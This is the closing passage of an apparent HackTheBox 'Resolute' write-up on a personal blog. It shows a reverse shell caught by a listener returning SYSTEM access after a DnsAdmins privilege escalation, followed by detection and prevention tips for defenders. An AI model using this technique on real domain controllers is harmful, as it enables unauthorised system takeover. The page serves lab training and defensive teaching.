+listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">4443</span> <span style="color:#f92672">...</span>
+connect to <span style="color:#f92672">[</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">14</span><span style="color:#f92672">.</span><span style="color:#ae81ff">4</span><span style="color:#f92672">]</span> from (<span style="color:#66d9ef">UNKNOWN</span>) <span style="color:#f92672">[</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">169</span><span style="color:#f92672">]</span> <span style="color:#ae81ff">53785</span>
+<span style="color:#66d9ef">Microsoft</span> <span style="color:#66d9ef">Windows</span> <span style="color:#f92672">[</span><span style="color:#66d9ef">Version</span> <span style="color:#ae81ff">10</span><span style="color:#f92672">.</span><span style="color:#ae81ff">0</span><span style="color:#f92672">.</span><span style="color:#ae81ff">14393</span><span style="color:#f92672">]</span>
+(c) <span style="color:#ae81ff">2016</span> <span style="color:#66d9ef">Microsoft</span> <span style="color:#66d9ef">Corporation</span><span style="color:#f92672">.</span> <span style="color:#66d9ef">All</span> rights reserved<span style="color:#f92672">.</span>
+
+<span style="color:#e6db74">C</span>:\<span style="color:#66d9ef">Windows</span>\system32<span style="color:#f92672">&gt;</span>whoami
+whoami
+nt authority\system
+
+<span style="color:#e6db74">C</span>:\<span style="color:#66d9ef">Windows</span>\system32<span style="color:#f92672">&gt;</span>
+</code></pre></div><p><strong>For the BlueTeamers there are some ways to detect or prevent dnsadmin privesc</strong></p>
+<ul>
+<li>
+<p>To prevent the attack, audit ACL for write privilege to DNS server object and membership of DNSAdmins group.</p>
+</li>
+<li>
+<p>Indicators like DNS service restart and couple of log entries:</p>
+<p>DNS Server Log Event ID 150 for failure and 770 for success</p>
+</li>
+<li>
+<p>Monitoring changes to HKLM:\SYSTEM\CurrentControlSet\services\DNS\Parameters\ServerLevelPluginDll will also help.</p>
+</li>
+</ul>
+<p>I Hope you found this helpful</p>
+
+    </div>
+
+    <div class="post-copyright">
+             
+            <p class="copyright-item">
+                <span>Author:</span>
+                <span>Astrah </span>
+                </p>
+            
+           
+            <p class="copyright-item">
+                    <span>Words:</span>
+                   <span>1358</span>
+            </p>
+            
+            <p class="copyright-item">
+                
+                <span>Share:</span>
+                <span>
+
+      
+        <a href="//twitter.com/share?url=https%3a%2f%2feriqueangwenyi.github.io%2f2020%2fresolute%2f&amp;text=Resolute%20Exploitation%20HackTheBox&amp;via=https%3a%2f%2ftwitter.com%2fErickAngwenyi1" target="_blank" title="Share on Twitter">
+          <i class="iconfont icon-twitter"></i>
+        </a>
+        
+      
+      
+      
+      
+      
+      
+      
+      
+        
+      
+        
+      
+
+          
+
+          
+
+          
+
+          
+</span>
+                
+            </p>
+
+             
+            <p class="copyright-item">
+                Released under <a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a>
+            </p>
+            
+    </div>
+
+  
+    <div class="post-tags">
+        
+            <section>
+            <i class="iconfont icon-icon-tag"></i>Tag: 
+            
+            <span class="tag"><a href="https://eriqueangwenyi.github.io/tags/windows/">
+                    #Windows</a></span>
+            
+            <span class="tag"><a href="https://eriqueangwenyi.github.io/tags/ad/">
+                    #AD</a></span>
+            
+            <span class="tag"><a href="https://eriqueangwenyi.github.io/tags/hackthebox/">
+                    #HackTheBox</a></span>
+            
+            <span class="tag"><a href="https://eriqueangwenyi.github.io/tags/active-directory/">
+                    #Active Directory</a></span>
+            
+            </section>
+        
+        <section>
+                <a href="javascript:window.history.back();">Back</a></span> · 
+                <span><a href="https://eriqueangwenyi.github.io">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav">
+        
+        <a href="https://eriqueangwenyi.github.io/2020/blackfield/" class="prev" rel="prev" title="Blackfield Exploitation HackTheBox"><i class="iconfont icon-dajiantou"></i>&nbsp;Blackfield Exploitation HackTheBox</a>
+         
+        
+    </div>
+
+    <div class="post-comment">
+          
+          <div id="disqus_thread"></div>
+  <script type="text/javascript">
+      (function() {
+          
+          
+          if (window.location.hostname == "localhost")
+              return;
+          var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+          var disqus_shortname = 'yourdiscussshortname';
+          dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+          (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+      })();
+  </script>
+  <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+  <a href="https://disqus.com/" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+
+ 
+
+          
+    </div>
+</article>
+          </div>
+		   </main>
+      <footer class="footer">
+    <div class="copyright">
+        &copy;
+        
+        <span itemprop="copyrightYear">2018 - 2020</span>
+        
+         
+            <span class="author" itemprop="copyrightHolder"><a href="https://eriqueangwenyi.github.io">Astrah</a> | </span>
+         
+
+		  <span>Crafted with ❤️ by <a href="https://github.com/Fastbyte01/KeepIt" target="_blank" rel="external nofollow noopener noreffer">KeepIt</a> & <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreffer">Hugo</a></span>
+    </div>
+</footer>
+
+
+
+
+
+
+
+
+
+
+
+
+    
+    <link crossorigin="anonymous" integrity="sha384-yziQACfvCVwLqVFLqkWBYRO3XeA4EqzfXKGwaWnenYn5XzqfJFlFdKEmvutIQdKb" href="https://lib.baomitu.com/lightgallery/1.6.12/css/lightgallery.min.css" rel="stylesheet">
+      
+     <script src="/js/vendor_gallery.min.js" async="" ></script>
+    
+  
+
+
+
+
+
+
+
+     </div>
+  </body>
+</html>
